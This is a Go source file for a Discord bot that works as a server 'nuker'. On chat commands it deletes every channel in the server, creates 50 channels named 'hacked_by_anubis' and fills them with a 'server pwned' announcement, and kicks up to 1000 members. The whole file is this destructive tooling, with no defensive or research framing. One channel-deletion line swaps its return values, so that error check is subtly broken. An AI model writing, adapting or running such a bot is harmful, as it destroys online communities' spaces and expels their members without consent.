package main

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"sync"
	"syscall"

	"github.com/bwmarrin/discordgo"
)

func main() {
	// Create a new Discord session using the provided bot token
	token := ("BOT_TOKEN_HERE")
	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Fatal("Error creating Discord session:", err)
	}

	// Set the bot's intents to listen to all events except privileged ones
	sess.Identify.Intents = discordgo.IntentsAllWithoutPrivileged

	// Register the message handler
	sess.AddHandler(messageHandler)

	// Open a connection to Discord
	if err := sess.Open(); err != nil {
		log.Fatal("Error opening connection:", err)
	}
	defer sess.Close() // Ensure the session is closed when the program exits

	fmt.Println("The bot is online")

	// Wait for a termination signal to gracefully shut down
	waitForShutdown()
}

// messageHandler handles incoming Discord messages
func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore messages from the bot itself
	if m.Author.ID == s.State.User.ID {
		return
	}

	// Handle specific command
	switch m.Content {
	case "/fuckserver":
		fuckserver(s, m)
	case "/conquer":
		conqueror(s, m)
	case "/kickall":
		kickall(s, m)
	}
}

// waitForShutdown blocks until a termination signal is received
func waitForShutdown() {
	// Create a channel to receive OS signals
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)

	// Block until a signal is received
	<-sc
	fmt.Println("Shutting down bot...")
}

func fuckserver(s *discordgo.Session, m *discordgo.MessageCreate) {
	fmt.Println("Command received: /fuckserver")

	// Get Guild ID
	guildhandler := m.GuildID
	fmt.Println("Guild ID", guildhandler)

	// Get a list of channels in the guild
	channels, err := s.GuildChannels(guildhandler)
	if err != nil {
		log.Println("Error fetching channels:", err)
		return
	}

	var wg sync.WaitGroup
	for _, channel := range channels {
		wg.Add(1)
		go func(channelID string) {
			defer wg.Done()
			err, _ := s.ChannelDelete(channelID)
			if err != nil {
				log.Println("Error deleting channel:", err)
				return
			}
			fmt.Println("Channel deleted successfully", channelID)
		}(channel.ID)
	}

	wg.Wait()
	fmt.Println("All channels have been deleted, calling conqueror.")
	conqueror(s, m)
}

func conqueror(s *discordgo.Session, m *discordgo.MessageCreate) {
	guildID := m.GuildID
	messagecontent := discordgo.MessageEmbed{
		Title:       "Heads up, server pwned by Anubis!",
		Description: "Server has been compromised. See the image below for details.",
		Image: &discordgo.MessageEmbedImage{
			URL: "https://imgur.com/a/pwned-PMdRZfU",
		},
		Color: 0xff0000, // Red color for the embed
	}

	var wg sync.WaitGroup
	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			channel, err := s.GuildChannelCreate(guildID, "hacked_by_anubis", discordgo.ChannelTypeGuildText)
			if err != nil {
				log.Println("Error creating channel:", err)
				return
			}
			fmt.Printf("Created new channel: %s (%s)\n", channel.Name, channel.ID)

			// Send message to new channel
			_, err = s.ChannelMessageSendEmbed(channel.ID, &messagecontent)
			if err != nil {
				log.Println("Error sending message:", err)
			}
			fmt.Printf("Warning message sent | ")
		}()
	}
	wg.Wait()
}

func kickall(s *discordgo.Session, m *discordgo.MessageCreate) {
	guildID := m.GuildID
	members, err := s.GuildMembers(guildID, "", 1000)
	if err != nil {
		log.Println("Error fetching members:", err)
		return
	}

	var wg sync.WaitGroup
	for _, member := range members {
		wg.Add(1)
		go func(userID string) {
			defer wg.Done()
			fmt.Println("Kicking user", userID)
			err := s.GuildMemberDelete(guildID, userID)
			if err != nil {
				log.Println("Error kicking user:", err)
			}
		}(member.User.ID)
	}
	wg.Wait()
}
